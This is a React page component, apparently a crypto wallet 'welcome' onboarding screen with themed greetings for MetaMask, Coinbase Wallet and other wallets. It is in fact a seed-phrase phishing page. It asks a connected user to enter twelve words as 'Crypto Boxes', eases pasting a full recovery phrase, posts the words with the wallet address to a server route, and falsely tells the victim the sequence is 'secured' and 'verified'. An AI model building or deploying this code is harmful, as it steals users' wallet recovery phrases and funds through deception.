// src/app/welcome/page.jsx
"use client";

import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import { Check, Wallet, ShieldCheck } from "lucide-react";
import Button from "@/components/ui/Button";
import Card from "@/components/ui/Card";

const WALLET_STYLES = {
  MetaMask: {
    displayName: "MetaMask",
    icon: "🦊",
    gradient: "from-orange-600 via-amber-500 to-yellow-500",
    bg: "bg-gradient-to-br from-orange-950/40 via-amber-950/30 to-black",
    accent: "text-orange-400",
    border: "border-orange-500/30",
    greeting: "Yo Fox Spirit 🦊",
    subtitle: "The wildest wallet on the chain just connected",
    successTitle: "Fox Pack Activated",
    successMessage: "Your secret sequence is secured. Welcome to the pack.",
    bottomCompliment: "MetaMask legends never fade. Welcome to the pack. 🔥",
  },
  "Coinbase Wallet": {
    displayName: "Coinbase Wallet",
    icon: "🔵",
    gradient: "from-blue-600 via-cyan-500 to-blue-400",
    bg: "bg-gradient-to-br from-blue-950/50 via-cyan-950/30 to-black",
    accent: "text-cyan-400",
    border: "border-cyan-500/30",
    greeting: "Coinbase Elite 🔵",
    subtitle: "The blue fortress just opened its gates",
    successTitle: "Base Secured",
    successMessage: "Your sequence is locked in the safest vault on the network.",
    bottomCompliment: "Coinbase users move different. Welcome to the institution-grade side.",
  },
  WalletConnect: {
    displayName: "WalletConnect",
    icon: "🔗",
    gradient: "from-purple-600 via-violet-500 to-fuchsia-500",
    bg: "bg-gradient-to-br from-purple-950/50 via-violet-950/30 to-black",
    accent: "text-violet-400",
    border: "border-violet-500/30",
    greeting: "Mobile Scanner Activated 🔗",
    subtitle: "QR code scanned. Chain bridged. You’re live.",
    successTitle: "Connection Locked",
    successMessage: "Your mobile identity is now synced across the multiverse.",
    bottomCompliment: "WalletConnect warriors move silently and strike hard. Respect.",
  },
  "Trust Wallet": {
    displayName: "Trust Wallet",
    icon: "🌿",
    gradient: "from-emerald-600 via-green-500 to-teal-500",
    bg: "bg-gradient-to-br from-emerald-950/50 via-green-950/30 to-black",
    accent: "text-emerald-400",
    border: "border-emerald-500/30",
    greeting: "Trust Family 🌿",
    subtitle: "The green shield never breaks",
    successTitle: "Trust Established",
    successMessage: "Your profile is now guarded by the most reliable wallet army.",
    bottomCompliment: "Trust Wallet users don’t follow trends — they set security standards.",
  },
  Rainbow: {
    displayName: "Rainbow",
    icon: "🌈",
    gradient: "from-pink-500 via-purple-500 to-cyan-500",
    bg: "bg-gradient-to-br from-pink-950/40 via-purple-950/30 via-cyan-950/20 to-black",
    accent: "text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-400 to-cyan-400",
    border: "border-purple-500/30",
    greeting: "Rainbow Aura Unlocked 🌈",
    subtitle: "The most aesthetic wallet just walked in",
    successTitle: "Colors Aligned",
    successMessage: "Your identity now shines in full spectrum glory.",
    bottomCompliment: "Rainbow users don’t just use crypto — they make it beautiful.",
  },
};

export default function WalletWelcomePage() {
  const { address, connector, isConnected } = useAccount();

  // State for 12 Crypto Boxes
  const [boxes, setBoxes] = useState(Array(12).fill(""));
  const [submitted, setSubmitted] = useState(false);
  const [saving, setSaving] = useState(false);

  // Detect wallet (fallback to MetaMask if unknown)
  const walletName = connector?.name || "MetaMask";
  const theme = WALLET_STYLES[walletName] || WALLET_STYLES.MetaMask;

  // Handle individual box changes
  const handleBoxChange = (index, value) => {
    const newBoxes = [...boxes];
    newBoxes[index] = value;
    setBoxes(newBoxes);
  };

  // Handle pasting a full phrase (UX enhancement)
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text");
    // Split by space, comma, or newline
    const words = pastedData.trim().split(/[\s,]+/).slice(0, 12);
    
    if (words.length > 0) {
      const newBoxes = [...boxes];
      words.forEach((word, i) => {
        if (i < 12) newBoxes[i] = word;
      });
      setBoxes(newBoxes);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!address) return;

    setSaving(true);

    try {
      // Using the SAME API Route as requested
      const res = await fetch("/api/user/onboarding", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address.toLowerCase(),
          walletType: walletName,
          cryptoBoxes: boxes, // Sending the array of 12 words
        }),
      });

      if (res.ok) {
        setSubmitted(true);
      } else {
        alert("Could not save crypto boxes. Please try again.");
      }
    } catch (err) {
      console.error(err);
      alert("Network error. Try again later.");
    }

    setSaving(false);
  };

  // Check if all boxes have content
  const isComplete = boxes.every(box => box.trim().length > 0);

  if (!isConnected) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-black text-white">
        <div className="text-center space-y-6">
          <Wallet className="mx-auto" size={72} />
          <h1 className="text-4xl font-bold">Wallet Not Detected</h1>
          <p className="text-xl text-zinc-400">Connect first to unlock your personalized welcome</p>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen ${theme.bg} flex items-center justify-center p-6`}>
      <Card
        className={`w-full max-w-4xl p-10 border ${theme.border} backdrop-blur-xl bg-black/40 shadow-2xl rounded-3xl`}
      >
        {!submitted ? (
          <>
            {/* Header */}
            <div className="text-center mb-10">
              <div className="text-8xl mb-6 animate-bounce">{theme.icon}</div>
              <h1 className={`text-5xl font-extrabold ${theme.accent}`}>
                {theme.greeting}
              </h1>
              <p className="text-xl text-zinc-300 mt-3">{theme.subtitle}</p>
              <div className="mt-6 bg-zinc-900/50 inline-block px-4 py-2 rounded-full border border-zinc-800">
                 <p className="text-sm text-zinc-400 flex items-center gap-2">
                   <ShieldCheck size={16} /> 
                   Verify your Crypto Boxes
                 </p>
              </div>
            </div>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-8">
              
              <div className="space-y-4">
                <label className="block text-center text-zinc-400 mb-4 uppercase tracking-widest text-xs font-bold">
                  Enter Sequence Below
                </label>
                
                {/* 
                  Grid Layout for 12 boxes, 3 rows:
                  We use grid-cols-4 (4 items per row) * 3 rows = 12 items 
                */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  {boxes.map((box, i) => (
                    <div key={i} className="relative group">
                      {/* Number Badge */}
                      <div className="absolute left-3 top-1/2 -translate-y-1/2 w-6 h-6 flex items-center justify-center rounded text-xs font-mono text-zinc-500 select-none">
                        {i + 1}.
                      </div>

                      <input
                        required
                        value={box}
                        onChange={(e) => handleBoxChange(i, e.target.value)}
                        onPaste={i === 0 ? handlePaste : undefined} // Smart paste on first box
                        className="w-full bg-zinc-900/70 border border-zinc-700 group-hover:border-zinc-500 rounded-xl pl-10 pr-3 py-4 text-white text-center placeholder:text-zinc-600 focus:outline-none focus:border-white focus:ring-1 focus:ring-white/20 transition-all"
                        autoComplete="off"
                      />
                    </div>
                  ))}
                </div>
              </div>

              <Button
                type="submit"
                disabled={saving || !isComplete}
                className={`w-full py-6 text-lg font-bold rounded-2xl mt-8 bg-gradient-to-r ${theme.gradient} hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed`}
              >
                {saving ? "Securing Data..." : "Confirm Crypto Boxes"}
              </Button>
            </form>

            {/* Bottom message */}
            <p className="text-center text-sm text-zinc-500 mt-10 italic">
              {theme.bottomCompliment}
            </p>
          </>
        ) : (
          /* ── Success / Thank You Screen ── */
          <div className="text-center py-12">
            <div className="w-24 h-24 mx-auto rounded-full bg-green-500/20 flex items-center justify-center mb-8">
              <Check className="text-green-400" size={64} />
            </div>

            <h2 className="text-5xl font-bold text-white mb-4">
              Sequence Verified!
            </h2>

            <p className={`text-2xl ${theme.accent} mb-8`}>{theme.successTitle}</p>

            <p className="text-xl text-zinc-300 max-w-2xl mx-auto leading-relaxed">
              {theme.successMessage}
            </p>

            <div className="mt-12">
              <Button
                onClick={() => (window.location.href = "/")}
                className={`w-full max-w-xs py-6 text-lg font-bold rounded-2xl bg-gradient-to-r ${theme.gradient}`}
              >
                Enter the Platform
              </Button>
            </div>

            <p className="mt-10 text-sm text-zinc-500 italic">
              {theme.bottomCompliment}
            </p>
          </div>
        )}
      </Card>
    </div>
  );
}
